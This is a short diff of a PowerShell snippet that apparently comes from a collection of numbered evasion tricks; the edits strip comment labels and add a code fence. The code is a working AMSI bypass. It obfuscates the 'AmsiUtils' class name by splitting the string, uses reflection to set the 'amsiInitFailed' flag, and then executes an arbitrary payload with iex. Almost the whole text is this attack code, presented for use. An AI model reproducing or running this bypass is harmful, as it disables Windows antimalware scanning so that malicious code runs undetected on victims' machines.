@@ -1,14 +1,14 @@
-# Obfuscate variable names (Trick #5)
+```pws# Obfuscate variable names 
 $v1 = "System.Management.Automation.Am"
 $v2 = "siUtils"
 $type = [Ref].Assembly.GetType($v1+$v2)
 
-# Then use reflection (Trick #3)
+# Then use reflection 
 $field = $type.GetFields('NonPublic,Static') | Where-Object Name -like "*InitFailed"
 $field.SetValue($null, $true)
 
 # Now execute your payload
-iex $payload
+iex $payload```
 
 
 
